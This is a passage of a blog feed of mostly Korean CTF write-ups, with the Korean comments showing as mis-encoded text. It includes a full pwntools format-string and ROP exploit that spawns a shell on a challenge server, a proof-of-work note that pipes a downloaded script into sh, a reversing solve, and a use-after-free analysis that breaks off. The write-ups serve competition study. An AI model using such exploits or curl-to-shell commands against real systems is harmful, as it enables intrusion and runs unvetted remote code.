class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./slackp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31500</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./slackp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%p_%9$p&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x2206a0</span></span><br><span class="line"></span><br><span class="line">info(<span class="built_in">hex</span>(stack_leak))</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset 25Î≤àÏß∏Ïóê Ï†ÄÏû•Îêú Ï£ºÏÜå 0x00007fffe4063d28 </span></span><br><span class="line">ptr_idx = stack_leak + <span class="number">0x2128</span> </span><br><span class="line">info(<span class="string">&#x27;ptr_idx :: &#x27;</span> + <span class="built_in">hex</span>(ptr_idx))</span><br><span class="line">payload = <span class="string">f&#x27;%<span class="subst">&#123;(ptr_idx+<span class="number">3</span>) &amp; <span class="number">0xffff</span>&#125;</span>c%25$hn&#x27;</span> <span class="comment"># hnÏùÄ 2Î∞î</span></span><br><span class="line">info(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%128c%55$hhn&#x27;</span>) <span class="comment"># hhnÏùÄ 1Î∞î</span></span><br><span class="line"><span class="comment"># gef&gt; x/wx $rbp-0x68</span></span><br><span class="line"><span class="comment"># 0x7fff51b42e88: 0x80000003  </span></span><br><span class="line"></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line">ret = libc.address + <span class="number">0x29cd6</span></span><br><span class="line"></span><br><span class="line">rop_payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop_payload += p64(pop_rdi)</span><br><span class="line">rop_payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">rop_payload += p64(ret)</span><br><span class="line">rop_payload += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">stack_ret = stack_leak + <span class="number">0x2198</span></span><br><span class="line"><span class="comment"># rop_payloadÎ•º stack_retÎ∂ÄÌÑ∞ 1Î∞îÏù¥Ìä∏Ïî© Ïç®Ïïº ÌïúÎã§.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rop_payload)):</span><br><span class="line">    <span class="comment"># 1. 25Ïóê Ï†ëÍ∑ºÌï¥ÏÑú 55Î≤àÏß∏Ïóê stack_ret 2Î∞îÏù¥Ìä∏Ïî© Ïì∞Í∏∞</span></span><br><span class="line">    payload = <span class="string">f&#x27;%<span class="subst">&#123;(stack_ret+i) &amp; <span class="number">0xffff</span>&#125;</span>c%25$hn&#x27;</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 55Ïóê Ï†ëÍ∑ºÌï¥ÏÑú(stack_retÏóê Ï†ëÍ∑ºÌï¥ÏÑú) rop_payload 1Î∞îÏù¥Ìä∏Ïî© Ïì∞Í∏∞</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> rop_payload[i] == <span class="number">0</span>:</span><br><span class="line">        <span class="comment">#info(hex(rop_payload[i]))</span></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        payload = <span class="string">f&#x27;%55$hhn&#x27;</span> </span><br><span class="line">        p.sendline(payload) <span class="comment"># sendÎ°ú Î≥¥ÎÇ¥Î©¥ ÏïàÎê®</span></span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        payload = <span class="string">f&#x27;%<span class="subst">&#123;rop_payload[i]&#125;</span>c%55$hhn&#x27;</span> </span><br><span class="line">        p.sendline(payload) <span class="comment"># sendÎ°ú Î≥¥ÎÇ¥Î©¥ ÏïàÎê®</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment"># stack_retÏóê rop_payload Ï†ÅÏñ¥Ï£ºÍ≥† ÌîÑÎ°úÍ∑∏Îû®ÏùÑ Ï¢ÖÎ£åÎêòÍ≤å ÎßåÎì§Ïñ¥Ïïº Ìï®</span></span><br><span class="line"><span class="comment"># ptr_idxÏóê 2 ÎÑ£Ïñ¥Ï£ºÏûê.</span></span><br><span class="line">payload = <span class="string">f&#x27;%<span class="subst">&#123;ptr_idx &amp; <span class="number">0xffff</span>&#125;</span>c%25$hn&#x27;</span> <span class="comment"># hnÏùÄ 2Î∞î</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%2c%55$n&#x27;</span>) <span class="comment"># nÏùÄ 4Î∞î</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>If you want to make function that writes <code>rop_payload</code> to the stack, you can do it like this. :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_byte</span>(<span class="params">addr, value</span>):</span><br><span class="line">    payload = <span class="string">f&#x27;%<span class="subst">&#123;addr &amp; <span class="number">0xffff</span>&#125;</span>c%25$hn&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;write <span class="subst">&#123;<span class="built_in">hex</span>(value)&#125;</span> to <span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload) == <span class="number">13</span>:</span><br><span class="line">        p.send(payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> value == <span class="number">0</span>:</span><br><span class="line">        p.sendline(<span class="string">f&#x27;%55$hhn&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="string">f&#x27;%<span class="subst">&#123;value&#125;</span>c%55$hhn&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;succesfu1_onb0arding_f99454d9a2f42632&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - proof of work (remote)</title>
      <link href="/230426-pwn-proof-of-work/"/>
      <url>/230426-pwn-proof-of-work/</url>
      
        <content type="html"><![CDATA[<p>Ï£ºÎ°ú Ìè¨ÎÑàÎ∏î Î¨∏Ï†úÏóêÏÑú Î¶¨Î™®Ìä∏Ïóê Ïó∞Í≤∞ÌñàÏùÑ Îïå Î∏åÌè¨ Î∞©ÏßÄÎ•º ÏúÑÌï¥ <code>proof of work</code>Î•º ÏöîÍµ¨ÌïòÎäî Í≤ΩÏö∞Í∞Ä ÏûàÎã§.</p><h2 id="proof-of-work"><a href="#proof-of-work" class="headerlink" title="proof of work"></a>proof of work</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proof of work: curl -sSfL https://pwn.red/pow | sh -s s.AAAdTA==.Ae+rYf3l1Pg/Ib8DPnqHKw==</span><br><span class="line">solution: </span><br></pre></td></tr></table></figure><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;proof of work: &#x27;</span>)</span><br><span class="line"><span class="comment"># print( repr( subprocess.check_output([&#x27;bash&#x27;, &#x27;-c&#x27;, p.recvline()]) ))</span></span><br><span class="line">p.send(subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, p.recvline()]))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> remote </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jersey CTF III 2023 - tracer</title>
      <link href="/230418-jerseyctf2023-tracer/"/>
      <url>/230418-jerseyctf2023-tracer/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1908">https://ctftime.org/event/1908</a></li></ul><blockquote><p>unknown</p></blockquote><ul><li>[? solves &#x2F; ? points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><ul><li></li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for ( i = 0; i &lt;= 304; ++i )</span></span><br><span class="line"><span class="comment"># &#123;</span></span><br><span class="line"><span class="comment"># for ( j = 0; j &lt;= 0x26; ++j )</span></span><br><span class="line">    <span class="comment"># flag[j] = key[j] ^ sbox[(unsigned __int8)flag[j]];</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">FC 55 A8 C7 F5 52 07 B4  25 B0 65 CC 9C 5F C8 90</span></span><br><span class="line"><span class="string">4B 1B 01 05 80 A3 06 D4  47 94 50 32 F9 04 52 58</span></span><br><span class="line"><span class="string">88 31 A5 BD 82 D9 8E 00  00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="string">00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">flag = [i <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">9A 81 14 C3 E0 CA C0 09  B8 C8 27 7A 5F D7 B1 ED</span></span><br><span class="line"><span class="string">9A 73 1A 8F 8C 04 92 8E  EA 7C 5A BD B1 B4 72 1B</span></span><br><span class="line"><span class="string">2F 3A 76 C6 C9 02 EA 00  00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="string">00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sbox = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">66 40 3A 55 92 34 EF AA  33 AF 4F B7 0C C9 B8 A4</span></span><br><span class="line"><span class="string">E4 EE FE EC 08 BD DA F1  91 DF 01 AE 75 5A 43 05</span></span><br><span class="line"><span class="string">F2 64 8B BC 61 A3 B6 C8  57 ED 94 98 03 8E AB 7D</span></span><br><span class="line"><span class="string">51 F7 65 CA 76 C5 50 D2  BE CD 1F 1C 26 97 D7 89</span></span><br><span class="line"><span class="string">19 C6 21 99 31 95 67 60  A8 10 7A 5C 53 0B 7C 30</span></span><br><span class="line"><span class="string">32 B2 12 29 CE E2 2E 7B  37 15 56 A1 2D 47 D1 88</span></span><br><span class="line"><span class="string">A5 2A 9B 5D F5 71 85 90  62 E6 D9 D8 11 0D 63 D3</span></span><br><span class="line"><span class="string">07 1A E3 70 24 F4 DC 4B  93 81 6E 8D F9 FD E0 A0</span></span><br><span class="line"><span class="string">73 DB 59 4E 17 87 96 42  BB CF BA 2B EA 44 6A 1D</span></span><br><span class="line"><span class="string">9D 4D 79 B9 BF 5F E9 F0  41 3C 28 6C AC FA 02 1B</span></span><br><span class="line"><span class="string">E1 B0 54 FB 84 D0 22 6F  13 F6 8C DD 52 68 D5 D4</span></span><br><span class="line"><span class="string">58 83 C2 EB E7 6D 18 E5  CC 00 9E FF CB 5B 78 C7</span></span><br><span class="line"><span class="string">2C C1 B1 FC 3F AD 9A A7  B4 5E F3 8F DE C3 14 E8</span></span><br><span class="line"><span class="string">2F 0F 8A 3D 36 49 48 C0  D6 23 04 7F 7E 3B 16 69</span></span><br><span class="line"><span class="string">25 0A A9 09 6B 77 F8 B5  45 A6 1E 06 20 0E 39 38</span></span><br><span class="line"><span class="string">4A 74 B3 4C 27 3E C4 72  86 80 A2 9C 9F 46 82 35</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">305</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">39</span>):</span><br><span class="line">        flag[j] = key[j] ^ sbox[flag[j]]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">flag = <span class="built_in">bytes</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Jersey </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HackPack CTF 2023 - Number Store (UAF)</title>
      <link href="/230417-hackpackctf2023-number_store/"/>
      <url>/230417-hackpackctf2023-number_store/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1893">https://ctftime.org/event/1893</a></li></ul><blockquote><p>Welcome to Number Store(TM)! A new FREE password manager. However, due to budget constraints we were only able to add support for storing numbers. Store your favorite secret numbers or generate new random ones! Also comes with a super secret flag!<br><code>nc cha.hackpack.club 41705</code></p></blockquote><ul><li>[48 solves &#x2F; 116 points]</li></ul><p>ÏïÑÎßà Ïù¥ Î∏îÎ°úÍ∑∏ ÏµúÏ¥à uaf Î°∏ÏóÖÏù¥ÏßÄ ÏïäÎÇò Ïã∂Îã§. Ìûô Î¨∏Ï†úÎ•º Í∏∞ÌîºÌñàÏóàÎäîÎç∞ ÌÉúÍ∑∏Í∞Ä easyÏó¨ÏÑú ÌíÄÏñ¥Î¥§Îã§..<br>ctf ÏãúÏûëÌïòÍ≥† Î∞îÏù¥ÎÑàÎ¶¨Î•º Îã§Ïö¥Î∞õÍ≥† ÎÅùÎÇòÍ≥† ÌíÄÏñ¥Î¥§ÎäîÎç∞ Ï§ëÍ∞ÑÏóê Î∞îÏù¥ÎÑàÎ¶¨Í∞Ä Î∞îÎÄåÏóàÎã§. <code>printFlag</code> Ìï®Ïàò Ï£ºÏÜåÎßå Î∞îÍøîÏ£ºÎãà remoteÎ°ú ÌîåÎûòÍ∑∏Î•º ÏñªÏùÑ Ïàò ÏûàÏñ¥ÏÑú Í∑∏ÎÉ• ÏòàÏ†Ñ Î∞îÏù¥ÎÑàÎ¶¨ ÏΩîÎìúÎ•º Î≥¥Í≤†Îã§ „Öé.. (Ïã§Ï†úÎ°ú Î∂ÑÏÑùÏùÄ ÏòàÏ†Ñ Î∞îÏù¥ÎÑàÎ¶¨Î°ú ÌñàÍ∏∞ ÎïåÎ¨∏..)</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ÏùºÎã® <code>main</code> Ìï®ÏàòÎ•º ÏÇ¥Ìé¥Î≥¥Ïûê.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> func_result; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> print_idx; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> edit_idx; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> IndexNum; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> UserNum; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  _QWORD *_func_result; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **Number_obj; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> *Number_obj_copy; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  Number_obj = (<span class="type">const</span> <span class="type">char</span> **)<span class="built_in">calloc</span>(<span class="number">10uLL</span>, <span class="number">8uLL</span>);<span class="comment">// 8ÏßúÎ¶¨ 10Í∞ú</span></span><br><span class="line">  Number_obj_copy = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">10uLL</span>, <span class="number">16uLL</span>);<span class="comment">// 16ÏßúÎ¶¨ 10Í∞ú</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">159</span>; i += <span class="number">16</span> )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;Number_obj_copy[i], <span class="string">&quot;none&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">  _func_result = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  printStr(<span class="string">&quot;WELCOME TO NUMBER STORE\n&quot;</span>);</span><br><span class="line">  printStr(<span class="string">&quot;Store your favorite or secret numbers here! You can even generate new random numbers!\n&quot;</span>);</span><br><span class="line">  printStr(<span class="string">&quot;Now includes a super secret flag!\n\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    printStr(<span class="string">&quot;1.) Store New Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;2.) Delete Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;3.) Edit Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;4.) Show Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;5.) Show Number List\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;6.) Generate Random Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;7.) Show Random Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;8.) Show Super Secret Flag\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;9.) Quit\n\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;Choose option: &quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)getUserNum() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Enter index of new number (0-9): &quot;</span>);</span><br><span class="line">        UserNum = getUserNum();</span><br><span class="line">        <span class="keyword">if</span> ( UserNum &gt;= <span class="number">10</span> )</span><br><span class="line">          <span class="keyword">goto</span> Index_out_of_bound;</span><br><span class="line">        createStaticNum(UserNum, (__int64)Number_obj);</span><br><span class="line">        <span class="built_in">strncpy</span>(&amp;Number_obj_copy[<span class="number">16</span> * UserNum], Number_obj[UserNum], <span class="number">0xF</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Enter index of number to delete (0-9): &quot;</span>);</span><br><span class="line">        IndexNum = getUserNum();</span><br><span class="line">        <span class="keyword">if</span> ( IndexNum &lt; <span class="number">10</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          deleteObject(IndexNum, (__int64)Number_obj);</span><br><span class="line">          <span class="built_in">strncpy</span>(&amp;Number_obj_copy[<span class="number">16</span> * IndexNum], <span class="string">&quot;none&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          printStr(<span class="string">&quot;Invalid Index!\n&quot;</span>);         <span class="comment">// ÏùåÏàò ÏïàÎê® oob x</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Enter index of number to edit (0-9): &quot;</span>);</span><br><span class="line">        edit_idx = getUserNum();</span><br><span class="line">        <span class="keyword">if</span> ( edit_idx &lt; <span class="number">0xA</span> )</span><br><span class="line">          editObject(edit_idx, (__int64)Number_obj);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          printStr(<span class="string">&quot;Invalid Index\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Select index of number to print (0-9): &quot;</span>);</span><br><span class="line">        print_idx = getUserNum();</span><br><span class="line">        <span class="keyword">if</span> ( print_idx &gt;= <span class="number">0xA</span> )</span><br><span class="line">Index_out_of_bound:</span><br><span class="line">          printStr(<span class="string">&quot;Index out of bounds!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          readObject(print_idx, (__int64)Number_obj);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        showList((__int64)Number_obj_copy);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span 